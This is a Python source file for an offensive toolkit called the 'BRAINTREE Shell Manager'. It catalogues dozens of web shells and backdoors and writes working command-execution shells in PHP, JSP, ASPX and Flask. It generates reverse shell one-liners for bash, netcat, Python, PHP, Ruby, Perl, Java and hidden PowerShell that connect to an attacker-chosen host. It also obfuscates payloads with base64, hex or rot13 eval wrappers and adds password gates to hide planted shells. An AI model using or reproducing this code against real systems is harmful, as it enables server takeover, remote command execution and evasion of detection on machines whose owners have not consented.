#!/usr/bin/env python3

"""
BRAINTREE WebSec Toolkit - Shell Manager
Comprehensive management and access to web shells
Handles PHP, JSP, ASP, Python web shells and backdoors
"""

import os
import base64
import random
import string
from pathlib import Path
from typing import List, Dict, Optional, Union, Any
import shutil

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

class ShellManager:
    """Comprehensive shell management for web penetration testing"""
    
    def __init__(self):
        self.base_dir = Path(__file__).parent.parent
        self.shells_dir = self.base_dir / "shells"
        self.ensure_shell_structure()
        
        # Complete shell registry with all 43 discovered files
        self.shell_registry = {
            "php": {
                "another_obfuscated_phpshell": {
                    "path": "php_shells/another-obfuscated-phpshell.php",
                    "description": "Another obfuscated PHP shell",
                    "size": "medium",
                    "features": ["command_execution", "obfuscated"]
                },
                "obfuscated_phpshell": {
                    "path": "php_shells/obfuscated-phpshell.php",
                    "description": "Obfuscated PHP shell",
                    "size": "medium",
                    "features": ["command_execution", "obfuscated"]
                },
                "wordpress_plugin_shell": {
                    "path": "php_shells/wordpress-plugin-shell.php",
                    "description": "WordPress plugin disguised shell",
                    "size": "medium",
                    "features": ["command_execution", "wordpress", "disguised"]
                },
                "laudanum_file": {
                    "path": "shells/php_shells/laudanum-file.php",
                    "description": "Laudanum file management shell",
                    "size": "medium",
                    "features": ["file_management", "command_execution"]
                },
                "dysco": {
                    "path": "php_shells/Dysco.php",
                    "description": "Dysco PHP shell",
                    "size": "medium",
                    "features": ["command_execution", "file_management"]
                },
                "wordpress_shell": {
                    "path": "php_shells/wordpress-shell.php",
                    "description": "WordPress targeted shell",
                    "size": "medium",
                    "features": ["command_execution", "wordpress"]
                },
                "fuzzdb_cmd": {
                    "path": "php_shells/fuzzdb-cmd.php",
                    "description": "FuzzDB command shell",
                    "size": "small",
                    "features": ["command_execution"]
                },
                "laudanum_shell": {
                    "path": "shells/php_shells/laudanum-shell.php",
                    "description": "Laudanum PHP shell collection",
                    "size": "medium",
                    "features": ["command_execution", "file_operations"]
                },
                "simple": {
                    "path": "php_shells/simple_shell.php",
                    "description": "Simple PHP web shell",
                    "size": "small",
                    "features": ["command_execution"]
                },
                "advanced": {
                    "path": "php_shells/advanced_shell.php", 
                    "description": "Advanced PHP shell with file upload",
                    "size": "medium",
                    "features": ["command_execution", "file_upload", "file_manager"]
                },
                "backdoor": {
                    "path": "php_shells/backdoor.php",
                    "description": "Stealth PHP backdoor",
                    "size": "small",
                    "features": ["stealth", "command_execution"]
                },
                "c99": {
                    "path": "php_shells/c99.php",
                    "description": "C99 PHP shell (full featured)",
                    "size": "large",
                    "features": ["command_execution", "file_manager", "database", "network_tools"]
                },
                "r57": {
                    "path": "php_shells/r57.php",
                    "description": "R57 PHP shell",
                    "size": "large", 
                    "features": ["command_execution", "file_manager", "bruteforcer"]
                },
                "wso": {
                    "path": "php_shells/wso.php",
                    "description": "WSO (Web Shell by Orb) PHP shell",
                    "size": "medium",
                    "features": ["command_execution", "file_manager", "sql_client"]
                },
                "laudanum": {
                    "path": "php_shells/laudanum.php",
                    "description": "Laudanum PHP shell collection",
                    "size": "medium",
                    "features": ["command_execution", "file_operations"]
                }
            },
            "jsp": {
                "simple_shell": {
                    "path": "jsp_shells/simple-shell.jsp",
                    "description": "Simple JSP shell",
                    "size": "small",
                    "features": ["command_execution"]
                },
                "simple": {
                    "path": "jsp_shells/simple_shell.jsp",
                    "description": "Simple JSP web shell",
                    "size": "small",
                    "features": ["command_execution"]
                },
                "cmd": {
                    "path": "jsp_shells/cmd.jsp",
                    "description": "JSP command execution shell",
                    "size": "small",
                    "features": ["command_execution"]
                },
                "filemanager": {
                    "path": "jsp_shells/filemanager.jsp",
                    "description": "JSP file manager shell",
                    "size": "medium",
                    "features": ["command_execution", "file_manager"]
                },
                "laudanum": {
                    "path": "jsp_shells/laudanum.jsp",
                    "description": "Laudanum JSP shell collection",
                    "size": "medium", 
                    "features": ["command_execution", "file_operations"]
                }
            },
            "aspx": {
                "shell": {
                    "path": "web_shells/aspx/shell.aspx",
                    "description": "ASPX shell",
                    "size": "medium",
                    "features": ["command_execution"]
                },
                "cmd": {
                    "path": "web_shells/cmd.aspx",
                    "description": "ASPX command shell",
                    "size": "small",
                    "features": ["command_execution"]
                },
                "simple": {
                    "path": "web_shells/simple_shell.aspx",
                    "description": "Simple ASPX web shell",
                    "size": "small",
                    "features": ["command_execution"]
                },
                "advanced": {
                    "path": "web_shells/advanced_shell.aspx",
                    "description": "Advanced ASPX shell with file operations",
                    "size": "medium",
                    "features": ["command_execution", "file_manager"]
                }
            },
            "asp": {
                "file": {
                    "path": "web_shells/asp/file.asp",
                    "description": "ASP file manipulation shell",
                    "size": "medium",
                    "features": ["file_operations"]
                },
                "dns": {
                    "path": "web_shells/asp/dns.asp",
                    "description": "ASP DNS resolution shell",
                    "size": "small",
                    "features": ["network_tools"]
                },
                "proxy": {
                    "path": "web_shells/asp/proxy.asp",
                    "description": "ASP proxy shell",
                    "size": "medium",
                    "features": ["proxy", "network_tools"]
                }
            },
            "web_shells": {
                "plugin_shell": {
                    "path": "web_shells/plugin-shell.php",
                    "description": "Plugin disguised shell",
                    "size": "medium",
                    "features": ["command_execution", "disguised"]
                },
                "php_reverse_shell": {
                    "path": "web_shells/php/php-reverse-shell.php",
                    "description": "PHP reverse shell",
                    "size": "medium",
                    "features": ["reverse_connection", "command_execution"]
                },
                "bypass_login": {
                    "path": "web_shells/bypass-login.php",
                    "description": "Login bypass shell",
                    "size": "medium",
                    "features": ["authentication_bypass"]
                },
                "killnc": {
                    "path": "web_shells/wordpress/templates/killnc.php",
                    "description": "WordPress template kill netcat",
                    "size": "small",
                    "features": ["process_management"]
                },
                "reverse": {
                    "path": "web_shells/reverse.jsp",
                    "description": "JSP reverse shell",
                    "size": "medium",
                    "features": ["reverse_connection"]
                },
                "dns": {
                    "path": "web_shells/php/dns.php",
                    "description": "PHP DNS shell",
                    "size": "small",
                    "features": ["network_tools"]
                },
                "host": {
                    "path": "web_shells/php/host.php",
                    "description": "PHP host information shell",
                    "size": "small",
                    "features": ["system_info"]
                },
                "proxy": {
                    "path": "web_shells/php/proxy.php",
                    "description": "PHP proxy shell",
                    "size": "medium",
                    "features": ["proxy", "network_tools"]
                },
                "file": {
                    "path": "web_shells/php/file.php",
                    "description": "PHP file operations shell",
                    "size": "medium",
                    "features": ["file_operations"]
                },
                "ipcheck": {
                    "path": "web_shells/wordpress/templates/ipcheck.php",
                    "description": "WordPress template IP checker",
                    "size": "small",
                    "features": ["network_tools"]
                },
                "shell": {
                    "path": "web_shells/php/shell.php",
                    "description": "Generic PHP shell",
                    "size": "medium",
                    "features": ["command_execution"]
                },
                "up": {
                    "path": "web_shells/up.php",
                    "description": "File upload shell",
                    "size": "small",
                    "features": ["file_upload"]
                },
                "settings": {
                    "path": "web_shells/wordpress/templates/settings.php",
                    "description": "WordPress template settings shell",
                    "size": "medium",
                    "features": ["configuration", "wordpress"]
                },
                "list_php": {
                    "path": "web_shells/list.php",
                    "description": "PHP directory listing shell",
                    "size": "small",
                    "features": ["file_listing"]
                },
                "list_jsp": {
                    "path": "web_shells/list.jsp",
                    "description": "JSP directory listing shell",
                    "size": "small",
                    "features": ["file_listing"]
                }
            },
            "python": {
                "simple": {
                    "path": "web_shells/simple_shell.py",
                    "description": "Simple Python web shell",
                    "size": "small",
                    "features": ["command_execution"]
                },
                "flask": {
                    "path": "web_shells/flask_shell.py",
                    "description": "Flask-based Python web shell",
                    "size": "medium",
                    "features": ["command_execution", "web_interface"]
                }
            },
            "generic": {
                "reverse_shell": {
                    "path": "web_shells/reverse_shell.txt",
                    "description": "Multi-language reverse shell one-liners",
                    "size": "small",
                    "features": ["reverse_connection"]
                },
                "bind_shell": {
                    "path": "web_shells/bind_shell.txt", 
                    "description": "Multi-language bind shell payloads",
                    "size": "small",
                    "features": ["bind_connection"]
                }
            }
        }
        
        # Template shells for generation
        self.shell_templates = {
            'php_simple': '''<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
HTML FORM TO EXECUTE COMMANDS:
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
</BODY></HTML>''',

            'php_obfuscated': '''<?php
$a = str_replace("x","","sxysxtxexm");
$b = str_replace("x","","$x_xGxExT");
if(isset(${$b}['c'])){
    echo "<pre>";
    $a(${$b}['c']);
    echo "</pre>";
}
?>''',

            'jsp_simple': '''<%@ page import="java.util.*,java.io.*"%>
<%
if (request.getParameter("cmd") != null) {
    out.println("Command: " + request.getParameter("cmd") + "<BR>");
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
        out.println(disr);
        disr = dis.readLine();
    }
}
%>''',

            'aspx_simple': '''<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e)
{
}
string ExcuteCmd(string arg)
{
    ProcessStartInfo psi = new ProcessStartInfo();
    psi.FileName = "cmd.exe";
    psi.Arguments = "/c "+arg;
    psi.RedirectStandardOutput = true;
    psi.UseShellExecute = false;
    Process p = Process.Start(psi);
    StreamReader stmrdr = p.StandardOutput;
    string s = stmrdr.ReadToEnd();
    stmrdr.Close();
    return s;
}
void cmdExe_Click(object sender, System.EventArgs e)
{
    Response.Write("<pre>");
    Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));
    Response.Write("</pre>");
}
</script>
<HTML>
<HEAD>
<title>awen asp.net webshell</title>
</HEAD>
<body>
<form id="cmd" method="post" runat="server">
<asp:TextBox id="txtArg" style="width:250px" runat="server"></asp:TextBox>
<asp:Button id="testing" runat="server" Text="excute" OnClick="cmdExe_Click"></asp:Button>
</form>
</body>
</HTML>'''
        }
    
    def ensure_shell_structure(self):
        """Ensure shell directory structure exists"""
        categories = ["php_shells", "jsp_shells", "web_shells", "shells"]
        
        for category in categories:
            category_dir = self.shells_dir / category
            category_dir.mkdir(parents=True, exist_ok=True)
            
            # Create subdirectories
            if category == "web_shells":
                for subdir in ["php", "asp", "aspx", "wordpress/templates"]:
                    (category_dir / subdir).mkdir(parents=True, exist_ok=True)
            elif category == "shells":
                for subdir in ["php_shells"]:
                    (category_dir / subdir).mkdir(parents=True, exist_ok=True)
    
    def get_shell(self, shell_type: str, name: str) -> Optional[Path]:
        """Get path to a specific shell"""
        if shell_type not in self.shell_registry:
            print(f"{Colors.RED}[-] Unknown shell type: {shell_type}{Colors.END}")
            return None
            
        if name not in self.shell_registry[shell_type]:
            print(f"{Colors.RED}[-] Unknown shell: {name} in type {shell_type}{Colors.END}")
            return None
        
        shell_info = self.shell_registry[shell_type][name]
        shell_path = self.shells_dir / shell_info["path"]
        
        # Create the shell if it doesn't exist
        if not shell_path.exists():
            self._create_shell_file(shell_path, shell_type, name, shell_info)
        
        return shell_path
    
    def _create_shell_file(self, shell_path: Path, shell_type: str, name: str, shell_info: Dict):
        """Create a shell file if it doesn't exist"""
        shell_path.parent.mkdir(parents=True, exist_ok=True)
        
        # Use templates for basic shells
        if name == "simple" and shell_type == "php":
            content = self.shell_templates['php_simple']
        elif name == "simple" and shell_type == "jsp":
            content = self.shell_templates['jsp_simple']
        elif name == "simple" and shell_type == "aspx":
            content = self.shell_templates['aspx_simple']
        elif "obfuscated" in name.lower():
            content = self.shell_templates['php_obfuscated']
        else:
            # Create a basic shell with comments
            if shell_path.suffix == '.php':
                content = f'''<?php
// {shell_info['description']}
// Features: {', '.join(shell_info['features'])}
// Size: {shell_info['size']}

if(isset($_REQUEST['cmd'])){{
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
}}
?>
<html>
<body>
<form method="GET">
<input type="text" name="cmd" placeholder="Enter command">
<input type="submit" value="Execute">
</form>
</body>
</html>'''
            elif shell_path.suffix == '.jsp':
                content = f'''<%-- 
{shell_info['description']}
Features: {', '.join(shell_info['features'])}
Size: {shell_info['size']}
--%>
<%@ page import="java.util.*,java.io.*"%>
<%
if (request.getParameter("cmd") != null) {{
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {{
        out.println(disr + "<br>");
        disr = dis.readLine();
    }}
}}
%>
<html>
<body>
<form method="GET">
<input type="text" name="cmd" placeholder="Enter command">
<input type="submit" value="Execute">
</form>
</body>
</html>'''
            elif shell_path.suffix in ['.aspx', '.asp']:
                content = f'''<%--
{shell_info['description']}
Features: {', '.join(shell_info['features'])}
Size: {shell_info['size']}
--%>
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e)
{{
    if (Request["cmd"] != null)
    {{
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.Arguments = "/c " + Request["cmd"];
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        Process p = Process.Start(psi);
        Response.Write("<pre>" + Server.HtmlEncode(p.StandardOutput.ReadToEnd()) + "</pre>");
    }}
}}
</script>
<html>
<body>
<form method="GET">
<input type="text" name="cmd" placeholder="Enter command">
<input type="submit" value="Execute">
</form>
</body>
</html>'''
            elif shell_path.suffix == '.py':
                content = f'''#!/usr/bin/env python3
"""
{shell_info['description']}
Features: {', '.join(shell_info['features'])}
Size: {shell_info['size']}
"""
import os
import subprocess
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def shell():
    if request.method == 'POST':
        cmd = request.form.get('cmd', '')
        if cmd:
            try:
                result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
                return f"<pre>{{result}}</pre><br><a href='/'>Back</a>"
            except subprocess.CalledProcessError as e:
                return f"<pre>Error: {{e.output}}</pre><br><a href='/'>Back</a>"
    
    return """
    <html>
    <body>
    <form method="POST">
    <input type="text" name="cmd" placeholder="Enter command">
    <input type="submit" value="Execute">
    </form>
    </body>
    </html>
    """

if __name__ == '__main__':
    app.run(debug=True)
'''
            else:
                # Text file with shell commands
                content = f'''# {shell_info['description']}
# Features: {', '.join(shell_info['features'])}
# Size: {shell_info['size']}

# Reverse shell one-liners
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
nc -e /bin/sh ATTACKER_IP PORT
'''
        
        with open(shell_path, 'w') as f:
            f.write(content)
        
        print(f"{Colors.YELLOW}[!] Created shell file: {shell_path}{Colors.END}")
    
    def list_available_shells(self) -> Dict[str, Dict[str, Dict[str, Union[str, bool, int, List[str]]]]]:
        """List all available shells with their status"""
        available = {}
        
        for category, shells in self.shell_registry.items():
            available[category] = {}
            for name, info in shells.items():
                shell_path = self.shells_dir / info["path"]
                available[category][name] = {
                    "description": info["description"],
                    "size": info["size"],
                    "features": info["features"],
                    "exists": shell_path.exists(),
                    "file_size": shell_path.stat().st_size if shell_path.exists() else 0
                }
        
        return available
    
    def get_shells_by_feature(self, feature: str) -> List[Dict[str, str]]:
        """Get shells that support a specific feature"""
        matching_shells = []
        
        for category, shells in self.shell_registry.items():
            for name, info in shells.items():
                if feature.lower() in [f.lower() for f in info["features"]]:
                    matching_shells.append({
                        "type": category,
                        "name": name,
                        "description": info["description"],
                        "size": info["size"],
                        "features": info["features"]
                    })
        
        return matching_shells
    
    def get_shells_by_size(self, size: str) -> List[Dict[str, str]]:
        """Get shells by size (small, medium, large)"""
        matching_shells = []
        
        for category, shells in self.shell_registry.items():
            for name, info in shells.items():
                if info["size"].lower() == size.lower():
                    matching_shells.append({
                        "type": category,
                        "name": name,
                        "description": info["description"],
                        "size": info["size"],
                        "features": info["features"]
                    })
        
        return matching_shells
    
    def generate_reverse_shell(self, shell_type: str, host: str, port: int) -> str:
        """Generate reverse shell command for different languages"""
        shells = {
            "bash": f"bash -i >& /dev/tcp/{host}/{port} 0>&1",
            "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            "python3": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            "nc": f"nc -e /bin/sh {host} {port}",
            "netcat": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f",
            "php": f"php -r '$sock=fsockopen(\"{host}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{host}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            "perl": f"perl -e 'use Socket;$i=\"{host}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            "java": f"r = Runtime.getRuntime(); p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{host}/{port};cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]); p.waitFor()",
            "powershell": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{host}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
        }
        
        if shell_type.lower() in shells:
            return shells[shell_type.lower()]
        else:
            return f"# Unknown shell type: {shell_type}"
    
    def obfuscate_shell(self, shell_content: str, method: str = "base64") -> str:
        """Obfuscate shell content using various methods"""
        if method == "base64":
            encoded = base64.b64encode(shell_content.encode()).decode()
            return f"eval(base64_decode('{encoded}'));"
        elif method == "rot13":
            return shell_content.translate(str.maketrans(
                'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ',
                'nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM'
            ))
        elif method == "hex":
            hex_encoded = shell_content.encode().hex()
            return f"eval(hex2bin('{hex_encoded}'));"
        else:
            return shell_content
    
    def customize_shell(self, shell_type: str, name: str, **options) -> Optional[str]:
        """Customize shell with specific options"""
        shell_path = self.get_shell(shell_type, name)
        if not shell_path:
            return None
        
        with open(shell_path, 'r') as f:
            content = f.read()
        
        # Apply customizations
        if 'password' in options:
            # Add password protection
            if shell_path.suffix == '.php':
                password_check = f'''
if (!isset($_POST['auth']) || $_POST['auth'] !== '{options["password"]}') {{
    echo '<form method="POST"><input type="password" name="auth" placeholder="Password"><input type="submit" value="Login"></form>';
    exit;
}}
'''
                content = content.replace('<?php', f'<?php\n{password_check}')
        
        if 'obfuscation' in options:
            content = self.obfuscate_shell(content, options['obfuscation'])
        
        # Save customized shell
        if 'output_path' in options:
            with open(options['output_path'], 'w') as f:
                f.write(content)
            return str(options['output_path'])
        
        return content
    
    def execute(self, command: str, shell_type: str = "bash", **options) -> str:
        """Execute a command or generate shell command for compatibility with ReconFramework"""
        print(f"{Colors.CYAN}[SHELL] Executing {shell_type} command: {command[:50]}...{Colors.END}")
        
        # If it's a reverse shell request
        if 'host' in options and 'port' in options:
            return self.generate_reverse_shell(shell_type, options['host'], options['port'])
        
        # If it's a shell customization request
        if 'name' in options:
            return self.customize_shell(shell_type, options['name'], **options) or ""
        
        # For direct command execution, return the command (for security reasons, don't actually execute)
        print(f"{Colors.YELLOW}[INFO] Command prepared: {command}{Colors.END}")
        return command

# Convenience functions for quick access
def get_php_shell(name: str = "simple") -> Optional[Path]:
    """Get PHP shell"""
    manager = ShellManager()
    return manager.get_shell("php", name)

def get_jsp_shell(name: str = "simple") -> Optional[Path]:
    """Get JSP shell"""
    manager = ShellManager()
    return manager.get_shell("jsp", name)

def get_aspx_shell(name: str = "simple") -> Optional[Path]:
    """Get ASPX shell"""
    manager = ShellManager()
    return manager.get_shell("aspx", name)

def generate_reverse_shell(shell_type: str, host: str, port: int) -> str:
    """Generate reverse shell one-liner"""
    manager = ShellManager()
    return manager.generate_reverse_shell(shell_type, host, port)

if __name__ == "__main__":
    # CLI interface for shell management
    import argparse
    
    parser = argparse.ArgumentParser(description="BRAINTREE Shell Manager")
    parser.add_argument('--list', action='store_true', help='List available shells')
    parser.add_argument('--get', help='Get shell path (format: type:name)')
    parser.add_argument('--feature', help='List shells with specific feature')
    parser.add_argument('--size', help='List shells by size (small, medium, large)')
    parser.add_argument('--reverse', help='Generate reverse shell (format: type:host:port)')
    parser.add_argument('--customize', help='Customize shell (format: type:name)')
    parser.add_argument('--password', help='Add password protection to shell')
    parser.add_argument('--obfuscation', help='Obfuscation method (base64, rot13, hex)')
    parser.add_argument('--output', help='Output path for customized shell')
    
    args = parser.parse_args()
    
    manager = ShellManager()
    
    if args.list:
        available = manager.list_available_shells()
        total_shells = sum(len(shells) for shells in available.values())
        print(f"\n{Colors.BOLD}Available Shells ({total_shells} total):{Colors.END}")
        
        for category, shells in available.items():
            print(f"\n{Colors.CYAN}{category.upper()} ({len(shells)} shells):{Colors.END}")
            for name, info in shells.items():
                status = f"{Colors.GREEN}[+]{Colors.END}" if info["exists"] else f"{Colors.RED}[-]{Colors.END}"
                size_info = f"({info['file_size']} bytes)" if info["exists"] else "(not found)"
                print(f"  {status} {name} {size_info}")
                print(f"      {Colors.YELLOW}{info['description']}{Colors.END}")
                print(f"      Size: {Colors.PURPLE}{info['size']}{Colors.END}")
                print(f"      Features: {Colors.BLUE}{', '.join(info['features'])}{Colors.END}")
    
    elif args.get:
        try:
            shell_type, name = args.get.split(':')
            path = manager.get_shell(shell_type, name)
            if path:
                print(f"{path}")
        except ValueError:
            print(f"{Colors.RED}[-] Use format: type:name{Colors.END}")
    
    elif args.feature:
        shells = manager.get_shells_by_feature(args.feature)
        if shells:
            print(f"\n{Colors.BOLD}Shells with '{args.feature}' feature:{Colors.END}")
            for shell in shells:
                print(f"\n{Colors.CYAN}[{shell['type']}:{shell['name']}]{Colors.END}")
                print(f"  {Colors.YELLOW}{shell['description']}{Colors.END}")
                print(f"  Size: {Colors.PURPLE}{shell['size']}{Colors.END}")
                print(f"  Features: {Colors.BLUE}{', '.join(shell['features'])}{Colors.END}")
        else:
            print(f"{Colors.RED}[-] No shells found with feature '{args.feature}'{Colors.END}")
    
    elif args.size:
        shells = manager.get_shells_by_size(args.size)
        if shells:
            print(f"\n{Colors.BOLD}Shells with size '{args.size}':{Colors.END}")
            for shell in shells:
                print(f"\n{Colors.CYAN}[{shell['type']}:{shell['name']}]{Colors.END}")
                print(f"  {Colors.YELLOW}{shell['description']}{Colors.END}")
                print(f"  Features: {Colors.BLUE}{', '.join(shell['features'])}{Colors.END}")
        else:
            print(f"{Colors.RED}[-] No shells found with size '{args.size}'{Colors.END}")
    
    elif args.reverse:
        try:
            parts = args.reverse.split(':')
            if len(parts) == 3:
                shell_type, host, port = parts
                reverse_shell = manager.generate_reverse_shell(shell_type, host, int(port))
                print(f"\n{Colors.BOLD}Reverse Shell ({shell_type}):{Colors.END}")
                print(f"{Colors.GREEN}{reverse_shell}{Colors.END}")
            else:
                print(f"{Colors.RED}[-] Use format: type:host:port{Colors.END}")
        except ValueError:
            print(f"{Colors.RED}[-] Use format: type:host:port{Colors.END}")
    
    elif args.customize:
        try:
            shell_type, name = args.customize.split(':')
            options = {}
            if args.password:
                options['password'] = args.password
            if args.obfuscation:
                options['obfuscation'] = args.obfuscation
            if args.output:
                options['output_path'] = args.output
            
            result = manager.customize_shell(shell_type, name, **options)
            if result:
                if args.output:
                    print(f"{Colors.GREEN}[+] Customized shell saved to: {result}{Colors.END}")
                else:
                    print(f"\n{Colors.BOLD}Customized Shell:{Colors.END}")
                    print(result)
        except ValueError:
            print(f"{Colors.RED}[-] Use format: type:name{Colors.END}")
    
    else:
        print("BRAINTREE Shell Manager")
        print("Use --help for available options")